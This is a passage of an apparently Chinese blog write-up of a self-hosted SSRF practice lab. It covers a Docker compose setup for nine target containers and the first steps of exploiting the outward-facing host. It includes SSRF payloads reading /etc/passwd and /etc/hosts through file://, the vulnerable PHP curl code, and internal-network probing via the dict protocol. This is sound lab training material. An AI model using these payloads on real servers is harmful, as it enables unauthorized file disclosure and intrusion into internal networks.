@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
+  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="国光是神">
+<meta property="og:type" content="article">
+<meta property="og:title" content="国光靶场ssrf打穿内网">
+<meta property="og:url" content="https://baozongwi.xyz/posts/3002ef95.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="国光是神">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/sqlsec/ssrf-vuls/blob/main/imgs/total.png?raw=true">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-101224.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-101720.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-102320.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-111356.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-112050.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-124509.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-124644.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-134621.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-134700.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-135308.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-135345.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-140301.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-140530.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-143707.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-143802.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-143742.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-144633.jpg">
+<meta property="article:published_time" content="2025-04-02T06:18:15.000Z">
+<meta property="article:modified_time" content="2025-08-08T04:18:11.098Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="ssrf">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/sqlsec/ssrf-vuls/blob/main/imgs/total.png?raw=true">
+
+
+<link rel="canonical" href="https://baozongwi.xyz/posts/3002ef95.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/3002ef95.html","path":"posts/3002ef95.html","title":"国光靶场ssrf打穿内网"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>国光靶场ssrf打穿内网 | baozongwi:H@cking Th3 Fu1ure</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-21%E5%A4%96%E7%BD%91SSRF"><span class="nav-number">1.</span> <span class="nav-text">192.168.100.21外网SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-22RCE"><span class="nav-number">2.</span> <span class="nav-text">192.168.100.22RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-23sqli"><span class="nav-number">3.</span> <span class="nav-text">192.168.100.23sqli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-24RCE"><span class="nav-number">4.</span> <span class="nav-text">192.168.100.24RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-25XXE"><span class="nav-number">5.</span> <span class="nav-text">192.168.100.25XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-26Tomcat-8-5-19"><span class="nav-number">6.</span> <span class="nav-text">192.168.100.26Tomcat&#x2F;8.5.19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-27redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-number">7.</span> <span class="nav-text">192.168.100.27redis未授权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-28redis%E6%8E%88%E6%9D%83"><span class="nav-number">8.</span> <span class="nav-text">192.168.100.28redis授权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#192-168-100-29%E6%9C%AA%E6%8E%88%E6%9D%83mysql"><span class="nav-number">9.</span> <span class="nav-text">192.168.100.29未授权mysql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baozongwi"
+      src="/images/acvtar.jpg">
+  <p class="site-author-name" itemprop="name">baozongwi</p>
+  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">202</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+<ul>
+  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
+  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
+  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
+  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
+  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
+</ul>
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/3002ef95.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/acvtar.jpg">
+      <meta itemprop="name" content="baozongwi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="天地不仁，以万物为刍狗">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="国光靶场ssrf打穿内网 | baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="国光是神">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          国光靶场ssrf打穿内网
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-04-02 14:18:15" itemprop="dateCreated datePublished" datetime="2025-04-02T14:18:15+08:00">2025-04-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-08-08 12:18:11" itemprop="dateModified" datetime="2025-08-08T12:18:11+08:00">2025-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">复现</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>9.1k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>15 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">国光是神</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>之前看过那篇文章所以非常想自己试试手，拓扑图如下</p>
+<p><img src="https://github.com/sqlsec/ssrf-vuls/blob/main/imgs/total.png?raw=true" alt="total.png"></p>
+<p>看着这么多，我们利用源码制作好docker之后放到dockerhub就可以只利用一台机器完成靶场搭建，每构建好一个需要推到dockerhub，运行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker commit 669053d5f83a baozongwi/ssrf-web2:latest</span><br><span class="line"></span><br><span class="line">docker login -u baozongwi</span><br><span class="line"># 登录之后就可以push上去了</span><br><span class="line"></span><br><span class="line">docker push baozongwi/ssrf-web2:latest</span><br><span class="line"></span><br><span class="line"># 用于清空镜像和容器</span><br><span class="line">docker rm -f $(docker ps -aq) &amp;&amp; docker rmi -f $(docker images -q)</span><br></pre></td></tr></table></figure>
+
+<p>但是弄到sqli那台机器之后168师傅回复我了，他居然还存了compose，不过这里也学会怎么往dockerhub上面pull了</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">ssrf_v:</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.0</span><span class="string">/24</span>  <span class="comment"># 改为 192.168.100.0/24，避免冲突</span></span><br><span class="line">          <span class="attr">gateway:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ssrfweb1:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_web:v1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">8090</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.21</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb2:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_codesec:v2</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.22</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb3:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_sql:v3</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.23</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb4:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_commandexec:v4</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.24</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb5:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_xxe:v5</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.25</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb6:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_tomcat:v6</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.26</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb7:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_redisunauth:v7</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.27</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb8:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_redisauth:v8</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.28</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb9:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_mysql:v9</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.29</span></span><br></pre></td></tr></table></figure>
+
+<p>但是肯定是要改网络的，每个人的网络都是不一样的，并且是9台机器</p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-101224.jpg" alt="1"></p>
+<h2 id="192-168-100-21外网SSRF"><a href="#192-168-100-21外网SSRF" class="headerlink" title="192.168.100.21外网SSRF"></a>192.168.100.21外网SSRF</h2><p>进入网站，看到是个爬虫网页，随便输入一个网页发现如下</p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-101720.jpg" alt="1"></p>
+<p>基本可以确诊是SSRF，我们试试<code>file</code>读取文件，发现成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>打算读取源码发现<code>file://index.php</code>没有成功但是可以从根目录过去读<code>file:///var/www/html/index.php</code>得到结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">     <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">     <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">     <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">     <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>非常典型的SSRF漏洞代码，顺便读取一个flag，<code>file:///var/www/html/flag</code>这台机器基本就没有用了，我们就要选择深入内网，还是做基本的信息收集，但是这里不能RCE，只能利用文件读取，所以我们先读取一下<code>hosts</code>得到这台机器的内网IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br><span class="line"></span><br><span class="line">#############################################</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">192.168.100.21	eb5b2908723b</span><br></pre></td></tr></table></figure>
+
+<p>使用dict协议进行爆破路由，超时就是未存活的IP，但是这种未超时又太过明显，如图</p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-102320.jpg" alt="1"></p>
